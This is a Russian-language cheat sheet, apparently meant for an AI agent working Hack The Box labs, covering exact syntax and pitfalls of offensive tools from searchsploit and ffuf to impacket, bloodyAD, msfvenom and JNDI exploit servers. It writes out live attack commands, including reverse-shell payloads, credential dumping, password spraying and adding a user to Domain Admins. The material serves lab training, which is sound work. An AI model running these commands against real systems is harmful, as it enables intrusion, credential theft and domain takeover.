# HTB: инструменты — точный синтаксис, вывод и типичные ошибки

## Перед запуском любого специализированного инструмента

1. Сначала эта карточка и профильный гайд (`search_docs`), потом — если флагов не хватает — `<tool> --help`/`-h` или `man <tool>` именно установленной версии.
2. Проверь входные файлы до запуска: `command -v <tool>`, `test -f <wordlist> && wc -l <wordlist>`.
3. Не режь вывод догадками (`| grep Found`, `| head`), пока не видел настоящий формат. Длинный/шумный результат пиши в файл (`-o /work/...`) и читай файл.
4. Ошибка, пустой вывод или `No Results` — это не «цель чистая», пока не проверены синтаксис, словарь, фильтры и код возврата. Следующий вариант — только после повторной сверки с инструкцией.

## searchsploit (локальный Exploit-DB)

Поиск — это термы без флага, по умолчанию AND и с учётом диапазонов версий:

```bash
searchsploit apache 2.4.18
searchsploit -t apache 2.4          # -t: только заголовки, меньше шума от путей
searchsploit --cve 2014-6271        # поиск по CVE
searchsploit -j apache 2.4 | jq     # JSON, когда табличный вывод обрезан/крашен
searchsploit -p 34900               # полный локальный путь эксплойта по EDB-ID
searchsploit -m 34900               # СКОПИРОВАТЬ эксплойт по EDB-ID в текущую папку
```

- `-m` не ищет: `searchsploit -m Apache/2.4.18` — ошибка использования. Сначала найди EDB-ID поиском, потом `-p`/`-m`.
- `-e/--exact` — точная фраза именно в заголовке; для первого поиска по продукту/версии обычно слишком узко. `-s/--strict` отключает попадание версии в диапазон (`< 2.4.38` перестанет находиться по `2.4.18`) — по умолчанию не нужен.
- Таблицу не фильтруй `grep exploit|cve`: заголовок таблицы и строки легко потерять, а цвета ломают совпадения. Смотри вывод целиком или `-j`.
- Не ищи эксплойты `curl`-ом по HTML-поиску exploit-db.com/vulners: локальная база уже в контейнере, веб-поиск отдаст JS/Cloudflare-обёртку.

## ffuf

```bash
test -f /usr/share/seclists/Discovery/Web-Content/common.txt
ffuf -u http://machine.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -mc 200,301,302,403 -t 20 -o /work/ffuf-dirs.json -of json
jq -r '.results[] | [.status,.length,.url] | @tsv' /work/ffuf-dirs.json
# vhosts: сначала базовый размер ответа, потом фильтр по нему
curl -s -o /dev/null -w '%{size_download}\n' http://machine.htb/
ffuf -u http://machine.htb -H "Host: FUZZ.machine.htb" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs <SIZE> -o /work/ffuf-vhosts.json -of json
```

- Словари, которые реально есть: `Discovery/Web-Content/common.txt`, `raft-medium-directories.txt`, `DirBuster-2007_directory-list-2.3-medium.txt`, `burp-parameter-names.txt`. Пути вида `dirb/common.txt` и `cgichars.txt` не выдумывать — проверять `test -f`/`ls`.
- В обычном выводе ffuf нет слова `Found`; фильтр `| grep -E "Found|Status:"` прячет и результаты, и ошибки, а код возврата становится кодом grep/head. Надёжно: `-o ... -of json` + `jq`, либо смотреть вывод как есть.
- Для CGI: фаззить `/cgi-bin/FUZZ` обычным словарём файлов/директорий с `-e .cgi,.pl,.sh`, а не несуществующим «cgi-словарём».
- Пустой результат при wildcard-ответах лечится калибровкой: базовый запрос → `-fs/-fl/-fw` или `-ac`, а не новым случайным словарём.

## feroxbuster и gobuster

```bash
feroxbuster -u http://machine.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -x php,txt,bak,old -o /work/ferox.txt
gobuster dir -u http://machine.htb -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,txt -o /work/gobuster.txt
gobuster vhost -u http://machine.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
```

- У gobuster режим — первый аргумент (`dir`, `vhost`, `dns`), без него команда не валидна.
- feroxbuster рекурсивен по умолчанию: на шумных целях ограничивай `--depth` и смотри файл результата, а не прогресс в терминале.

## katana (краулер endpoint'ов)

Не фаззер по словарю, а краулер: ходит по ссылкам, формам и JS и собирает реальные endpoint'ы с параметрами — карта поверхности до ffuf и ручных проверок.

```bash
katana -u http://machine.htb -d 3 -jc -kf robotstxt,sitemapxml -duc -o /work/scans/katana.txt
katana -u http://machine.htb -d 2 -jc -silent -duc                 # только URL в stdout — в пайп (sort -u, httpx-toolkit)
katana -u http://machine.htb -H "Cookie: PHPSESSID=..." -d 3 -jc    # за авторизацией (кука из своей http_request-сессии)
```

- Scope по умолчанию `rdn` (домен второго уровня), глубина 3: наружу не уползёт, но соседние поддомены захватит. Только этот хост — `-fs fqdn`.
- `-jc` достаёт endpoint'ы из JS — включать почти всегда; `-jsl` (jsluice) глубже, но ест память. SPA без `-hl` (headless) даст почти пустой результат: ссылки там рисует JS.
- Всегда `-duc` в скриптах: без него katana на старте проверяет обновления по сети. Вывод — список URL-гипотез, не факты: параметры и доступность подтверждать http_request/руками.

## nmap и NSE-скрипты

Базовые сканы — htb-01-recon-enum (`-p-`, затем `-sCV -p <открытые>`). Для NSE имя скрипта не выдумывать по номеру CVE:

```bash
ls /usr/share/nmap/scripts/ | grep -i shellshock
nmap --script-help http-shellshock
nmap -p 80 --script http-shellshock --script-args uri=/cgi-bin/test.cgi $TARGET
```

- Скрипта `http-vuln-cve2017-15715` в поставке нет; есть отдельные `http-vuln-cveYYYY-NNNN.nse` и именованные вроде `http-shellshock`. Существование проверять `ls`, назначение и аргументы — `--script-help`.
- `-sC` = набор default-скриптов, `--script vuln` — широкая и интрузивная категория: не запускать «на всякий случай» вместо точечного скрипта.
- Shellshock проверяется только против CGI-эндпоинтов (`/cgi-bin/*.cgi|*.sh|*.pl`), не против статического `/`.

## curl для веба

```bash
curl -sS -i http://machine.htb/path
curl -sS -H 'Host: vhost.machine.htb' http://$TARGET/
curl -sS -o /work/body.html -w '%{http_code} %{size_download}\n' http://machine.htb/path
```

- `-sS` показывает ошибки, но прячет прогресс; голый `-s` прячет и ошибки соединения.
- Для Shellshock заголовок с `() { :; };` слать только на CGI-скрипт и ждать маркер в теле/исходящий запрос; ответ статической страницы ничего не доказывает.

## rustscan и autorecon

```bash
rustscan -a $TARGET --ulimit 5000 -- -Pn -oN /work/rustscan.txt   # после -- идут флаги nmap
autorecon $TARGET -o /work/recon                                 # итоги: /work/recon/*/report/notes.txt
```

- AutoRecon сам запускает профильные инструменты и шумит: в управляемом режиме — только если пользователь попросил широкий проход.

## whatweb, wpscan, nikto, nuclei

```bash
whatweb -a 3 http://machine.htb
wpscan --url http://machine.htb --enumerate p,u,ap --plugins-detection aggressive
nikto -h http://machine.htb -output /work/nikto.txt    # у nikto -h — это ХОСТ, не help
nuclei -u http://machine.htb -severity critical,high,medium -o /work/nuclei.txt
```

- У nikto справка — `nikto -H`/`man nikto`; `nikto -h <цель>` уже сканирует.
- Вывод сканеров — гипотезы: каждую находку подтверждай руками (`curl`, версия, searchsploit), а не цитируй как факт.

## sqlmap

```bash
sqlmap -u "http://machine.htb/page?id=1" --batch --dbs
sqlmap -r /work/request.txt --batch --dbs        # POST/куки: сырой запрос из Burp/curl
sqlmap -u "http://machine.htb/page?id=1" --batch -D dbname --tables
```

- Сначала ручная проверка (`'`, разница ответов/времени), потом sqlmap. `--os-shell` и дамп всего подряд — только когда точечный дамп уже понятен.

## nxc / netexec, enum4linux-ng, SMB

Бинарь в образе — и `nxc`, и `netexec` (одно и то же). Протокол — первым аргументом:

```bash
nxc smb $TARGET
nxc smb $DC -u user -p pass --shares --users --groups --pass-pol
nxc smb $TARGET -u user -H <NTLM> --sam
enum4linux-ng -A $TARGET
smbclient -NL //$TARGET
smbmap -H $TARGET -u user -p pass -R
```

- `Pwn3d!` в выводе nxc = локальный админ, сигнал к psexec/secretsdump. Перед спреем смотреть `--pass-pol`.

## impacket-*

Все бинари с префиксом и разным синтаксисом: перед каждым новым — `impacket-<имя> -h`. Частые формы:

```bash
impacket-GetNPUsers domain.local/ -usersfile users.txt -no-pass -dc-ip $DC -format hashcat -outputfile asrep.txt
impacket-GetUserSPNs domain.local/user:pass -dc-ip $DC -request -outputfile kerberoast.txt
impacket-secretsdump domain.local/user:pass@$TARGET
impacket-psexec domain.local/user:pass@$TARGET
impacket-smbserver share /opt/tools -smb2support
```

- Формы учёток не смешивать: где-то `domain/user:pass`, где-то `-u user@domain -p pass`, хэш — `-hashes :NTLM`. Точную форму смотреть в `-h` конкретного бинаря.
- `KRB_AP_ERR_SKEW` — расхождение времени с DC: `faketime "<время DC>" impacket-...` (см. htb-04-windows-ad).

## certipy-ad, bloodhound-python, bloodyAD, evil-winrm, responder, kerbrute

```bash
certipy-ad find -u user@domain.local -p pass -dc-ip $DC -stdout   # бинарь именно certipy-ad, не certipy
bloodhound-python -d domain.local -u user -p pass -ns $DC -c All
evil-winrm -i $TARGET -u user -p pass        # или -H <NTLM>
kerbrute userenum --dc $DC -d domain.local users.txt
```

- certipy-ad: подкоманды `find/req/auth` с разным набором флагов — `certipy-ad <подкоманда> -h` перед запуском, шаги строго по найденному ESC.
- Responder (`responder -I tun0`) травит LLMNR/NBT-NS всего сегмента: в односегментных HTB-лабах обычно бесполезен и шумен — без причины не запускать.

bloodyAD — запись прав в AD через LDAP, когда BloodHound показал ребро (GenericWrite/GenericAll/WriteOwner/WriteDacl/AddMember/ForceChangePassword), а менять объект руками через LDAP долго. Хост DC обязателен `-H`; цели везде — sAMAccountName, DN или SID:

```bash
bloodyAD -H $DC -d domain.local -u user -p pass get writable --detail   # что вообще могу писать этой учёткой
bloodyAD -H $DC -d domain.local -u user -p pass set password target 'NewPass123!'
bloodyAD -H $DC -d domain.local -u user -p :<NTLM> add groupMember 'Domain Admins' user
bloodyAD -H $DC -d domain.local -u user -p pass add shadowCredentials target   # сам сделает PKINIT и отдаст TGT/ccache
bloodyAD -H $DC -d domain.local -u user -p pass add rbcd target service$
```

- Аутентификация: `-p` — пароль или `LMHASH:NTHASH` (пустой LM: `:NTHASH`); Kerberos — `-k` (с -p сам запросит TGT, или `ccache=/path`), сертификат — `-c key:cert`. Подкоманды `get/set/add/remove` у каждой свой синтаксис: `bloodyAD <группа> <подкоманда> -h` перед запуском, угаданный DN/порядок аргументов — главная причина пустых ошибок LDAP.
- `set password` без права ForceChangePassword требует `--oldpass`. После любой записи (смена пароля, groupMember, shadowCredentials) результат перепроверять отдельной аутентификацией (nxc/kerberos), а не верить «[+]» в выводе; что поменял в AD — фиксировать в профиле (доступ/креды), чужие пароли машина может не пережить до reset.

## hydra и medusa

```bash
hydra -l admin -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt ssh://$TARGET -t 4 -f
hydra -L users.txt -p 'Password123!' smb://$TARGET
```

- `-l/-L` — логин(ы), `-p/-P` — пароль(и): перепутанные регистры дают «тихий» пустой перебор не того. По сети — только короткие таргетные списки и спрей; rockyou по сети почти всегда ошибка (htb-06-passwords).

## john, hashcat, hashid

Режимы и форматы — htb-06-passwords. Главные ловушки:

- Тип хэша при сомнении — `hashid -m hash.txt`; формат строки сверять с `hashcat --example-hashes`.
- `hashcat -m <MODE> hash.txt /usr/share/wordlists/rockyou.txt` в контейнере идёт на CPU (pocl): медленные хэши вне словаря отдавать пользователю на GPU-хост.
- Уже вскрытое смотреть `--show` (у john — `john --show --format=<fmt> hash.txt`), а не запускать крекинг заново.

## msfconsole и msfvenom

```bash
msfconsole -q -x 'search type:exploit <продукт>; exit'
msfvenom -p linux/x64/shell_reverse_tcp LHOST=$LHOST LPORT=4444 -f elf -o /work/shell.elf
msfvenom -l payloads | grep -i <нужный>
```

- В неинтерактивном shell агента msfconsole запускать одним `-x '...; exit'`, иначе ход зависнет в консоли. Опции модуля — `show options` внутри, не по памяти.

## Туннели и шеллы: chisel, ligolo-ng, penelope, jwt_tool

- Ligolo-пара в образе: прокси — `ligolo-proxy` (не `ligolo-ng`), агенты — `/opt/tools/linux/ligolo-agent`, `/opt/tools/windows/ligolo-agent.exe`. Порядок — htb-03-shells-transfer-pivot.
- Chisel одной версии с обеих сторон: у нас `/usr/local/bin/chisel`, Windows-агент — `/opt/tools/windows/chisel.exe`.
- `penelope -p 4444` — листенер с авто-апгрейдом TTY; `jwt_tool <token>`, слабый секрет: `jwt_tool <token> -C -d /usr/share/wordlists/rockyou.txt`.

## Инструменты «на цель»: linpeas, winPEAS, pspy

Лежат в `/opt/tools/linux` и `/opt/tools/windows` и запускаются НА цели, а не из контейнера по сети: раздать `python3 -m http.server` из `/opt/tools/...`, на цели скачать и выполнить, вывод — файлом обратно в `/work` (htb-03, htb-05).

## Java: javac, JDK 8 и JNDI-серверы (rogue-jndi, marshalsec, JNDI-Injection-Exploit)

В контейнере две Java: обычная `javac`/`java` — JDK 25, и Temurin JDK 8 в `/opt/jdk8` с именами `java8`, `javac8`, `jar8`. Сборщик — `mvn` (3.9).

```bash
javac8 Exploit.java                      # класс для цели на Java 8 (major version 52)
javap -v Exploit.class | grep major      # проверить версию: 52 = Java 8, 69 = Java 25
# rogue-jndi: LDAP (1389) + HTTP (8000) одним процессом, удалённый класс генерит сам из команды
rogue-jndi --command 'bash -c {echo,<base64>}|{base64,-d}|{bash,-i}' --hostname <tun0-IP>
# marshalsec: только LDAP-редирект на codebase; класс раздаётся отдельно
cd /work/www && cp ../exploits/Exploit.class . && python3 -m http.server 8888
ldaprefserver http://<tun0-IP>:8888/#Exploit 1389
# welk1n: ссылки ldap/rmi + свои серверы 1389/1099/8180
jndi-injection-exploit -C '<команда>' -A <tun0-IP>
```

Ловушки:

- Класс, скомпилированный `javac` 25 без флага, на цели с Java 8 умрёт с UnsupportedClassVersionError и молча «не сработает». Для старых целей — `javac8` (или `javac --release 8`), результат проверять по major version.
- Все три JNDI-инструмента уже лежат в `/opt/tools/jndi/` (`rogue-jndi.jar`, `marshalsec.jar`, `JNDI-Injection-Exploit.jar`), качать их с GitHub НЕ надо. Wrappers `rogue-jndi`/`ldaprefserver`/`jndi-injection-exploit` сами запускают jar под `java8`, руками `java -jar` (это Java 25!) их не запускать.
- rogue-jndi без `--hostname` подставляет адрес docker-интерфейса eth0 (172.x) — цель за классом туда не дойдёт. `--hostname` (и `-A` у welk1n, и codebase URL у marshalsec) = IP `tun0` контейнера (`ip -4 addr show tun0`).
- У `jndi-injection-exploit` флага `--help` нет: на него отвечает «Cmdlines parse failed» — это не поломка, синтаксис здесь и в README (`-C команда -A адрес`). У `ldaprefserver` справка — запуск без аргументов.
- Скачанный jar всегда проверять перед запуском: `file x.jar` (должен быть Zip/Java archive) и размер. Скачивание по битой ссылке без `curl -f` сохраняет 9-байтный текстовый «Not Found», и `java -jar` потом падает с «Invalid or corrupt jarfile».
- Старые Java-проекты собирать `JAVA_HOME=/opt/jdk8 mvn package`: под JDK 25 они падают на удалённых API и старых плагинах.
